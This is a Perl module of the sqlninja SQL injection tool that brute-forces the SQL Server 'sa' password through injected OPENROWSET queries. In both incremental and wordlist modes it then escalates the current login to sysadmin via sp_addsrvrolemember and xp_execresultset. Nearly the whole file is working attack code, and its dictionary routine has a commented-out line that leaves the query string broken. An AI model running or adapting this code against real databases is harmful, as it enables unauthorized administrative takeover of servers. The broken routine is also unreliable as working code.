# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Depending on whether a wordlist has been specified, choose the 
# bruteforcing method
sub brute
{
	if ($conf->{'wordlist'} eq "") {
		print "[+] No wordlist specified: using incremental ".
			"bruteforce\n";
		bruteincr();
	} else {
		print "[+] Wordlist has been specified: using ".
			"dictionary-based bruteforce\n";
		brutedict();
	}
}


# Bruteforce the sa account password using the remote/incremental approach and
# performs the privilege escalation
# It splits the job in chunks, with the following logic:
# 1st chunk: passwords of 1 characters
# 2nd chunk: passwords of 2 characters
# 3rd chunk: passwords of 3 characters
# For larger characters, sqlninja splits the job: for each chunk, the first
# part of the passwords is fixed and only the last three chars are incremented
# So, for a password of 4 characters we will have the following chunks:
# 1 - a+++
# 2 - b+++
# and so on. The idea behind that is that if the password is 'abcdef' we don't
# want the code to run all the way to 'zzzzzz'. Of course, we could use just
# one big chunk that for each cycle checks if xp_execresultset succeeded, but
# the additional check, repeated for each cycle, would slow down the attack.
sub bruteincr
{
	my $plength = -1;
	print "  Max password length";
	while ($plength > 10 or $plength < 1) {
		print "  [min:1 max:10]\n> ";
		$plength = <STDIN>;
		chomp $plength;
	}
	my $charnum = -1;
	print "  Charset to use:\n".
	      "  1) {a-z}{0-9}\n".
	      "  2) {a-z}{0-9}-+_!{}[],.\n".
	      "  3) {a-z}{0-9}-+_!{}[],.@#\$%^'*\(\)=:\"\\/<>";
	while ($charnum > 3 or $charnum < 1) {
		print "\n> ";
		$charnum = <STDIN>;
		chomp $charnum;
	}
	my $charset= "abcdefghijklmnopqrstuvwxyz0123456789";
	if ($charnum > 1) {
		$charset .= "-+_!{}[],.";
	}
	if ($charnum > 2) {
		$charset .= "@#\$%^'*\(\)=:\"\\/<>";
	}
	my $charsetlength = length($charset);
	my $found = 0;
	# First round: 1 character
	print "[+] Trying passwords of length...1\n";
	bruteround(1,$charset,0);
	$found = fingerprint_sysadmin(0);
	if ($found == 1) {
		print "[+] Done ! You are an administrator now ! :) \n";
		exit(0);
	}
	if ($plength == 1) {
		bruteincrnotfound();
	}

	# Second round... 2 characters, and we also start doing some
	# time measuring
	print "[+] Trying passwords of length...2\n";
	bruteround(2,$charset,0);
	$found = fingerprint_sysadmin(0);
	if ($found == 1) {
		print "[+] Done ! You are an administrator now ! :) \n";
		exit(0);
	}
	if ($plength == 2) {
		bruteincrnotfound();
	}

	# Third round... 3 characters
	print "[+] Trying passwords of length...3\n";
	my $time1 = time();
	bruteround(3,$charset,0);
	my $time2 = time();
	# Time check....
	if (($time2 - $time1) < 3) {
		print "[-] Queries returning so quickly mean that something ".
			"is not working.\n".
		      "    Check configuration file\n";

		# this error occurs from SQL Server 2005. A used stored procedure does not exist
		#TODO: add support for later versions of SQL Server if possible (nico)
		print "    ...or it could be the SQL Server version. Let me check...\n";
		my $version = fingerprint_version();
		if ($version ne "2000") {
			print "    Yes, only works on SQL Server 2000, sorry!\n";
		} else {
			print "    No, that's not it!\n";
		}

		exit(1);
	}
	$found = fingerprint_sysadmin(0);
	if ($found == 1) {
		print "[+] Done ! You are an administrator now ! :) \n";
		exit(0);
	}
	if ($plength == 3) {
		bruteincrnotfound();
	}

	# Now we start trying 4+ sequences in separate chunks. Each chunk
	# varies the last 3 characters only
	my $i = 4; # Initial length
	my @pointchar; # Pointers to the charset
	my $pointcharcount; # Number of pointers
	while (($found == 0) and ($i <= $plength)) {
		print "[+] Trying passwords of length...".$i."\n";		
		# Initialize the pointers to the beginning of the charset
		for (my $j=0;$j<$i-3;$j++) {
			$pointchar[$j] = 0;
		}
		# How many pointers we have so far ?
		$pointcharcount = @pointchar;
		
		# Start playing with the pointers, until the first one
		# has passed through all values
		while ($pointchar[0] <= ($charsetlength - 1)) {
			my $pointchar_ref = \@pointchar;
			if ($conf->{'verbose'} == 1) {
				print "[+] Trying '";
				for (my $z=0;$z<$pointcharcount;$z++) {
					print substr($charset,$pointchar[$z],1);
				}
				print "___' chunk\n";
			}
			bruteround(3,$charset,$pointchar_ref);
			$found = fingerprint_sysadmin(0);
			if ($found == 1) {
				print "[+] Done ! You are an administrator".
						" now ! :)\n";
				exit(0);
			}
			$pointchar[$pointcharcount-1]++;
			# If the least significative has passed through
			# the whole charset, we need to reset it to zero
			# and increase the next by one
			for (my $z=$pointcharcount-1;$z>0;$z--) {
				if ($pointchar[$z] > $charsetlength-1) {
					$pointchar[$z] = 0;
					$pointchar[$z-1]++;
				}
			}
		}
		# Step to password of one char more....
		$i++;
	}	
	if ($found == 1) {
		print "[+] Done ! You are an administrator now ! :) \n";
		exit(0);
	} else {
		bruteincrnotfound();
	}
}

sub bruteincrnotfound 
{
	print "[-] Seems not to have worked. Try longer passwords or ".
		"a larger charset...\n";
	exit(0);
}


sub bruteround
{
	my $plength = $_[0];
	my $charset = $_[1];
	my @pointchar;
	my $pointcharlen;
	if ($_[2] != 0) { 
		@pointchar=@{$_[2]};
		$pointcharlen=@pointchar;
	}

	my $charlength = length($charset)+1;

	my $chunkid;
	for (my $z=0;$z<$pointcharlen;$z++) {
		$chunkid .= substr($charset,$pointchar[$z],1);
	}
	# We need to double-escape the quotes in the chunk id
	$chunkid =~ s/'/''''/g;
	
	my $query;
	
	# Let's start the main query.... here's where things get funny

	# First we declare all needed variables...
	$query = "declare \@p nvarchar(99),\@z nvarchar(10),\@s nvarchar(99), ";

	# We need a cursor (and one variable) for each password character
	for (my $i=0;$i<$plength;$i++) {
		$query .= "\@".chr($i+97)." int, ";
	}
	$query .="\@q nvarchar (4000) ";
	
	# We initialize all the cursors...
	for (my $i=0;$i<$plength;$i++) {
		 $query .= "set \@".chr($i+97)."=1 ";
	}
	
	# Then the charset, in which quotes must be escaped
	my $charset_ = $charset;
	$charset_ =~ s/'/''/g;
	$query .="set \@s=N'".$charset_."' ";

	# And we start all the nested cycles... one per cursor
	for (my $i=0;$i<$plength;$i++) {
		$query .= "while \@".chr($i+97)."<".$charlength." begin ";
	}
	
	# Cycle body: we build the password candidate...
	# We start by the characters common to this chunk
	$query .="set \@p=N'".$chunkid."' ";

	# Then we add the rest
	for (my $i=0;$i<$plength;$i++) {
		$query .= "set \@z = substring(\@s,\@".chr($i+97).",1) ";
		$query .= "if \@z='''' set \@z='''''' "; # double escaping
		$query .="set \@p=\@p+\@z ";
	}


	#TODO: Needs to be revised for SQL Server > 2000, xp_execresultset has been removed (nico)
	# ...and we try to add the current user to the sysadmin group
	$query .="set \@q=N'select 1 from OPENROWSET(''SQLOLEDB'',".
		 "''Network=DBMSSOCN;Address=;uid=sa;pwd='+\@p+N''',".
		 "''select 1;".
		 "exec master.dbo.sp_addsrvrolemember '''''+".
		 "system_user+N''''',''''sysadmin'''' '')' ".
		  "exec master.dbo.xp_execresultset \@q,N'master' ";
	
	# We close the cycles and update cursors accordingly
	for (my $i=$plength-1;$i>-1;$i--) {
		$query .= "set \@".chr($i+97)."=\@".chr($i+97)."+1 end ".
				"set \@".chr($i+97)."=1 ";
	}
	
	# ...and finally send the bloody thing
	sendrequest($query);
}



# Bruteforce the sa account password using the network/dictionary approach.
sub brutedict
{
	# We fix $blindtime to 59 seconds, since bruteforcing might slow
	# down server responses. And after all, the 'waitfor' is executed
	# only once, so no big deal
	$conf->{'blindtime'} = 59;
	print "  Number of concurrent processes";
	my $procnum = -1;
	while ($procnum > 10 or $procnum < 0) {
		print "  [min:1 max:10 default:3]\n> ";
		$procnum = <STDIN>;
		chomp($procnum);
		if ($procnum eq "") {
			$procnum = 3;
		}
	}
	open(FILE,"<".$conf->{'wordlist'}) || die "[-] Can't open wordlist file...".
	         				"exiting\n";
	
	my %procarray;
	my $procid;
	my $ninjasock = genfile();
	unlink $ninjasock;
	# Create the socket to talk with children
	if ($conf->{'verbose'} == 1) {
		print "  [v] Creating UNIX socket for children messages\n";
	}
	my $server =  new IO::Socket::UNIX->new(Local => $ninjasock,
						Type  => SOCK_DGRAM,
						Listen   => 30)
				|| die "can't create UNIX socket: $!\n";
	
	my $brutestarttime = time();
	my $i = 0;
	if ($conf->{'verbose'} == 1) {
		print "  [v] Launching children processes\n";
	}
	while ($i<$procnum) {
		$procid = fork();
		# it's a child ? Get out of this cycle 
		if ($procid == 0) {
			$i=$procnum;
		# the fork() failed ? Kill other children and exit
		} elsif (!defined($procid)) {
			while(my($p,$j)=each %procarray) {
				kill TERM => $p;
			}
			print "[-] fork failed: ".$!." ...exiting\n";
			exit(1);
		# fork successful and this is the father... 
		# so keep track and move on
		} else {
			$procarray{$procid}=0;
			$i++;
		}
	}
	# Children are all started by now, and they must start
	# their bruteforce
	if ($procid == 0) {
		$server->close;
		brutechild($ninjasock);
	}
	# The father, meanwhile, listens until either:
	# a) the wordlist is over
	# b) a child finds the correct password
	my $msg;
	my $finished = 0;
	my $candidate;
	$i = 0;
	print "[+] Bruteforcing the sa password. This might take a while\n";
	$SIG{ALRM} = \&timed_out;
	while ($finished == 0) {
		eval {
			alarm($conf->{'blindtime'}*3);
			$server->recv($msg,255);
			# $1: childpid
			# $2: opcode:
			#     0: request word
			#     1: found password
			# $3: password
			alarm(0);
		};
		if ($msg eq "") {
			# This should not be necessary... but just in case
			while (my ($a,$b) = each %procarray) {
				kill TERM => $a;
			}
			print "[-] No news from children. Something went ".
			      "wrong... exiting\n";
			exit(1);
		}
		$msg =~ /^(\d+)\n(\d)\n(\S+)/;
		if ($2 == 0) {
			# The child is asking for a word to try
			if (defined($candidate=<FILE>)) {
				$i++;
				chomp($candidate);
				if (($conf->{'verbose'} == 1) and ($i % 1000 == 0)) {
					print "  [v] Fetching pwd n.".$i.": ".
							$candidate."\n";
				}
				$server->send($candidate."\n");
			} else {
				kill TERM => $1;
				delete($procarray{$1});
				# when no more keys, exit
				if (keys(%procarray) == 0) {
					$finished = 1;
				}
			}
		} else {
			# We found the password !
			# Visualize it, kill children, exit
			$conf->{'password'} = $3;
			print "  dba password is...: ".$conf->{'password'}."\n";
			my $elapsed = time() - $brutestarttime;
			print "bruteforce took ".$elapsed." seconds\n";
			while (my ($a,$b) = each %procarray) {
				kill TERM => $a;
			}
			unlink $ninjasock;
			close FILE;
			# Now we do the escalation bit
			escalation();
			exit(0);
		}
	}
	print "[-] Sorry... password not found. Try another wordlist\n";
	unlink $ninjasock;
	close FILE;
	exit(0);
}

sub timed_out
{
	die "timeout";
}

# Each bruteforcing process uses this subprocedure
sub brutechild()
{
	my $pwd;
	my $query;
	my $time1;
	my $time2;
	my $k;
	my $ninjasock=$_[0];
	my $ninjasock1=genfile()."$$";
	$k=IO::Socket::UNIX->new(Peer => $ninjasock,
				 Local => $ninjasock1,
				 Type     => SOCK_DGRAM,
				 Timeout  => 10)
				|| die "could not create UNIX socket\n";

	while (1) {
		$k->send($$."\n0\nnopwd");
		$k->recv($pwd,255);
		chomp($pwd);
		# $pwd =~ s/ /%20/g; # If the password has whitespaces
		# $query = "select * from OPENROWSET('SQLOLEDB','';'sa';'".$pwd.
		$query = "select * from OPENROWSET('SQLOLEDB','Network=".
			"DBMSSOCN;Address=;uid=sa;pwd=".$pwd."',".
# 			"'waitfor delay ''0:0:".$conf->{'blindtime'}."'';select 1;');";
		$time1=time();
		sendrequest($query);
		$time2=time();
		if (($time2 - $time1) > ($conf->{'blindtime'} - 2)) {
			# FOUND IT !!
			$k->send($$."\n1\n".$pwd);
		} 
	}
	close $k;
	exit(0);
}

1;